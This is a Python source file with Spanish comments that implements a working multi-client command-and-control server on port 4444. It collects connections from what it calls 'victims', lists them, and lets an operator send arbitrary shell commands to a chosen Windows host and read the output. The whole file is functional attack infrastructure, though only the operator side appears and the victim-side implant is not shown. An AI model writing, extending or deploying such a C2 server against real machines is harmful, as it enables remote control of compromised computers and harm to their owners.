import socket
import threading

# Listas globales para guardar a las víctimas
lista_conexiones = []
lista_direcciones = []

def aceptar_conexiones(server):
    """ Este es el hilo RECEPCIONISTA. Siempre escuchando. """
    while True:
        try:
            conn, addr = server.accept()
            # Bloqueamos para que la conexión no se cierre por inactividad
            conn.setblocking(1) 
            
            # Guardamos a la víctima en nuestras listas
            lista_conexiones.append(conn)
            lista_direcciones.append(addr)
            
            print(f"\n[+] ¡NUEVO AGENTE! Se ha conectado: {addr[0]}")
            print("C2_Menu> ", end="") # Re-imprime el menú para no romper la consola
        except:
            print("Error aceptando la conexión")

def interactuar_con_agente(conn, target_id, ip_victima):
    """ Función para hablar con una víctima específica """
    print(f"\n[*] Conectado al Agente {target_id} ({ip_victima})")
    print("[*] Escribe 'back' para volver al menú principal.\n")
    
    while True:
        comando = input(f"Agente_{target_id}> ")
        
        if comando == 'back':
            break
            
        if len(comando) > 0:
            try:
                conn.send(comando.encode())
                # Mantenemos el cp850 para los acentos de Windows
                respuesta = conn.recv(4096).decode('cp850', errors='replace') 
                print(respuesta)
            except:
                print("[-] Se ha perdido la conexión con el agente.")
                break

def consola_c2():
    """ Este es el hilo OPERADOR. El menú principal. """
    while True:
        comando = input("C2_Menu> ")
        
        if comando == 'list':
            print("\n--- AGENTES CONECTADOS ---")
            if len(lista_conexiones) == 0:
                print("No hay agentes conectados actualmente.")
            else:
                for i, addr in enumerate(lista_direcciones):
                    print(f"[{i}] - IP: {addr[0]} | Puerto: {addr[1]}")
            print("--------------------------\n")
            
        elif comando.startswith('select'):
            # Separamos el comando para coger el número (ej: 'select 0')
            try:
                target_id = int(comando.split(" ")[1])
                conn = lista_conexiones[target_id]
                ip_victima = lista_direcciones[target_id][0]
                interactuar_con_agente(conn, target_id, ip_victima)
            except:
                print("[-] Uso incorrecto o ID no válido. Ejemplo: select 0")
                
        elif comando == 'exit':
            print("Cerrando el Framework C2...")
            # Aquí idealmente cerraríamos todas las conexiones antes de salir
            break
        elif comando == '':
            pass
        else:
            print("Comandos disponibles: list, select <id>, exit")

def iniciar_servidor():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 4444))
    server.listen(5) # Ahora podemos poner en cola hasta 5 conexiones simultáneas
    print("[*] Servidor C2 Multicliente iniciado en puerto 4444.")
    print("[*] Escribe 'list' para ver los agentes o 'select <id>' para interactuar.\n")

    # Arrancamos el hilo Recepcionista en segundo plano
    hilo_recepcionista = threading.Thread(target=aceptar_conexiones, args=(server,))
    hilo_recepcionista.daemon = True # Se cierra si cerramos el programa principal
    hilo_recepcionista.start()

    # Arrancamos el hilo Operador (Menú)
    consola_c2()

if __name__ == "__main__":
    iniciar_servidor()
